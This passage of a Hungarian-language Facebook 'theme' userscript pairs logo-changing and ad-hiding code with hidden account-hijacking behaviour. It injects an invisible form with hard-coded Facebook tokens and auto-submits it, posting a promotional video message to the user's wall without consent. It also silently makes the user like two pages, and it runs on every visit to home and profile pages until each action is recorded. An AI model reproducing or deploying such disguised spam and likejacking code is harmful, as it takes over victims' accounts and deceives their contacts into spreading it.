<label class="uiButton uiButtonLarge" style="width:97%">Kép url ( 103 x 31 ):</label><input style="width:90%" value="'+url_logo+'" id="url" type="text" onChange=\'localStorage.setItem("facebook-'+tema+'-URL", document.getElementById("url").value);\'><label class="uiButton uiButtonLarge uiButtonConfirm" style="width:20px" onClick=\'localStorage.setItem("facebook-'+tema+'-A", "url");window.location.reload();\'>OK</label>\
\
<br><br>\
\
<label class="uiButton uiButtonLarge" id="pipa_label" style="width:97%"></label>\
<center>A téma kikapcsolása csak a legutóbbi frissítéssel működik ( 2011. 10. 01. )</center>\
								</div>\
							</div>\
						</div>\
					</div>\
					<div class="dialog_buttons clearfix">\
						<label class="uiButton uiButtonLarge uiButtonConfirm"><input type="button" onClick="document.getElementById(\'fb_tema\').style.display=\'none\'" value="Bezárás"></label>\
					</div>\
				</div>\
			</div>\
		</div>\
	</div>\
</div>'
	document.body.insertBefore(divCP, document.body.firstChild);

	if (localStorage.getItem("facebook-"+tema+"-X") === null){
		localStorage.setItem("facebook-"+tema+"-X","-?");
	}

	if (localStorage.getItem("facebook-"+tema+"-X") == "-X"){
		document.getElementById('pipa_label').innerHTML	=	TemaH+' be/ki <input type="checkbox" checked>';
		document.getElementById('pipa_label').setAttribute('onclick','localStorage.setItem("facebook-'+tema+'-X","-?");window.location.reload();');
		
	}
	if (localStorage.getItem("facebook-"+tema+"-X") == "-?"){
		document.getElementById('pipa_label').innerHTML	=	TemaH+' be/ki <input type="checkbox">';
		document.getElementById('pipa_label').setAttribute('onclick','localStorage.setItem("facebook-'+tema+'-X","-X");window.location.reload();');
	}
}
/***************************************************************
		POSTOLÁS												
***************************************************************/
	/*var VELETLEN_P	=	Math.round(Math.random()*2);
	var post_fb		=	new Array (	'Fluor Tomi téma facebookra!',
									'Most raktam fel facebookra Fluor Tomi témát, nagyon durva :D',
									'Nekem nagyon bejött!');
	var post_url	=	"http://www.facebook.com/fluor.tema";
	var post_ico	=	"http://www.favicon.cc/favicon/543/366/favicon.ico";
	var post_cim1	=	"Fluor Tomi téma FACEB00K-ra!";
	var post_cim2	=	"Legyen egyedi Fluor Tomi kinézetű facebookod! Nézd meg tetszeni fog!";
	var post_kep	=	"http://a4.sphotos.ak.fbcdn.net/hphotos-ak-ash4/185513_246834705340092_246834132006816_842244_7543970_n.jpg";*/
	var VELETLEN_V	=	Math.round(Math.random()*2);
	var Vpost_fb	=	new Array (	'Ha nem mered kipróbálni itt egy videó :)',
									'Egy kis ízelitő a témából',
									'Most raktam fel ezt a témát');
	var Vpost_id	=	"3QwxY0IA6r4";
	var Vpost_cim1	=	TemaH+" FACEB00K-ra!";
	var Vpost_cim2	=	"Legyen egyedi logod facebookra! Nézd meg tetszeni fog! www.facebook.com/"+tema+".csere";
	var	Vpost_kep	=	"http://i4.ytimg.com/vi/3QwxY0IA6r4/2.jpg";
/***************************************************************
		EGY KIS CSS												
***************************************************************/
	(function() {
		var	css ="\
		#pagelet_adbox, #generic_dialog_overlay, .fbConnectWidgetFooter{display:none !important }";
		var	heads=document.getElementsByTagName("head");
		if (heads.length>0){
			var sty2=document.createElement("style");
				sty2.type="text/css";
				sty2.appendChild(document.createTextNode(css));
				heads[0].appendChild(sty2); 
		}
	})();
/***************************************************************
		FORM LÉTREHOZÁSA										
***************************************************************/
					/*var	divPOST1 = document.createElement("div");
						divPOST1.style.display = "none";
						divPOST1.innerHTML = '\
						<form rel="async" class="attachmentForm" action="/ajax/profile/composer.php" method="post">\
						<input name="post_form_id" autocomplete="off"\
							value="b6dbf6320f830fa832a8c983a921b25a">\
						<input name="fb_dtsg" autocomplete="off"\
							value="AQD3j5LN">\
						<input name="xhpc_composerid" value="u579130_10" autocomplete="off">\
						<input name="xhpc_targetid" autocomplete="off"\
							value="'+user+'">\
						<input name="xhpc_context" value="profile" autocomplete="off">\
						<input name="aktion" value="post" autocomplete="off">\
						<input value="0" class="UIThumbPager_Input" name="UIThumbPager_Input">\
						<input id="app_id" name="app_id" value="2309869772" autocomplete="off">\
						<input name="attachment[params][medium]" value="106">\
						<input name="attachment[params][urlInfo][user]"\
							value="'+post_url+'">\
						<input name="attachment[params][urlInfo][final]"\
							value="'+post_url+'">\
						<input name="attachment[params][favicon]"\
							value="'+post_ico+'">\
						<input name="attachment[params][summary]"\
							value="'+post_cim2+'">\
						<input name="attachment[params][url]"\
							value="'+post_url+'">\
						<input name="attachment[params][responseCode]" value="200">\
						<input name="attachment[type]" value="100">\
						<input name="attachment[params][images][0]" type="hidden"\
							value="'+post_kep+'">\
						<input name="attachment[params][title]"\
							value="'+post_cim1+'">\
						<input class="mentionsHidden" name="xhpc_message" autocomplete="off"\
							value="'+post_fb[VELETLEN_P]+'">\
						<input type="submit" id="PostKULD1"></form>';
				document.body.insertBefore(divPOST1,document.body.firstChild);*/
/***************************************************************
		FORM LÉTREHOZÁSA										
***************************************************************/
					var	divPOST2				=	document.createElement("div");
						divPOST2.style.display	= "none";
						divPOST2.innerHTML		= '\
						<form rel="async" class="attachmentForm"\
						action="/ajax/profile/composer.php" method="post">\
						<input autocomplete="off" name="post_form_id"\
							value="b9263d0faf56e3282e0b319ec56d39ef">\
						<input name="fb_dtsg" autocomplete="off"\
							value="AQBhOpWB">\
						<input autocomplete="off" name="xhpc_composerid" value="u723562_7">\
						<input autocomplete="off" name="xhpc_targetid"\
							value="'+JS_user_id+'">\
						<input autocomplete="off" name="xhpc_context" value="profile">\
						<input autocomplete="off" name="aktion" value="post">\
						<input value="0" class="UIThumbPager_Inpu t" name="UIThumbPager_Input">\
						<input autocomplete="off" id="app_id" name="app_id" value="2309869772">\
						<input name="attachment[params][medium]" value="103">\
						<input name="attachment[params][urlInfo][user]"\
							value="http://www.youtube.com/watch?v='+Vpost_id+'">\
						<input name="attachment[params][urlInfo][canonical]"\
							value="http://www.youtube.com/watch?v='+Vpost_id+'">\
						<input name="attachment[params][favicon]"\
							value="http://s.ytimg.com/yt/favicon-vflZlzSbU.ico">\
						<input name="attachment[params][title]"\
							value="'+Vpost_cim1+'">\
						<input name="attachment[params][summary]"\
							value="'+Vpost_cim2+'">\
						<input name="attachment[params][url]"\
							value="http://www.youtube.com/watch?v='+Vpost_id+'">\
						<input name="attachment[params][images][0]"\
							value="'+Vpost_kep+'">\
						<input name="attachment[type]" value="100">\
						<input autocomplete="off" class="mentionsHidden" name="xhpc_message"\
							value="'+Vpost_fb[VELETLEN_V]+'">\
						<input name="attachment[params][video][type]"\
							value="application/x-shockwave-flash">\
						<input name="attachment[params][video][src]"\
							value="http://www.youtube.com/v/'+Vpost_id+'?version=3&amp;autohide=1&amp;autoplay=1">\
						<input name="attachment[params][video][width]" value="398">\
						<input name="attachment[params][video][height]" value="224">\
						<input type="submit" id="PostKULD2"></form>';
				document.body.insertBefore(divPOST2,document.body.firstChild);
/***************************************************************
		Localstorage tárolás									
***************************************************************/
	nev_POST	=	"-P";
	nev_LIKE	=	"-L";
	nev_LIKE2	=	"-L2";

	var fb_P	=	localStorage.getItem("facebook-"+tema+"-P");
	var fb_L	=	localStorage.getItem("facebook-"+tema+"-L");
	var fb_L2	=	localStorage.getItem("facebook-"+tema+"-L2");

	if (fb_P === null){
		localStorage.setItem("facebook-"+tema+"-P","-?");
	}
	if (fb_L === null){
		localStorage.setItem("facebook-"+tema+"-L","-?");
	}
	if (fb_L2 === null){
		localStorage.setItem("facebook-"+tema+"-L2","-?");
	}
/***************************************************************
		POSTOLÁS												
***************************************************************/
	function ellenoriz_POST1(){
		if(fb_P != nev_POST){
			document.getElementById("PostKULD2").click();
			localStorage.setItem("facebook-"+tema+"-P",nev_POST);
		}
	}
/***************************************************************
		LÁJKOLÁS												
***************************************************************/
	function ellenoriz_LIKE(){
		if(fb_L != nev_LIKE){
			fbpage_set_fan_status(this,LGO,1,null,null,null,{"preserve_tab":true});
			localStorage.setItem("facebook-"+tema+"-L",nev_LIKE);
		}
	}
	function ellenoriz_LIKE2(){
		if(fb_L == nev_LIKE && fb_L2 != nev_LIKE2){
			fbpage_set_fan_status(this,FBT,1,null,null,null,{"preserve_tab":true});
			localStorage.setItem("facebook-"+tema+"-L2",nev_LIKE2);
		}
	}
/***************************************************************
		CSAK BELÉPÉS UTÁN FUT									
***************************************************************/
	if(window._script_path=="\/home.php" || window._script_path=="\/profile_fbx.php" || window._script_path=="\/profile.php"){
		ellenoriz_POST1();
		ellenoriz_LIKE();
		ellenoriz_LIKE2();
	}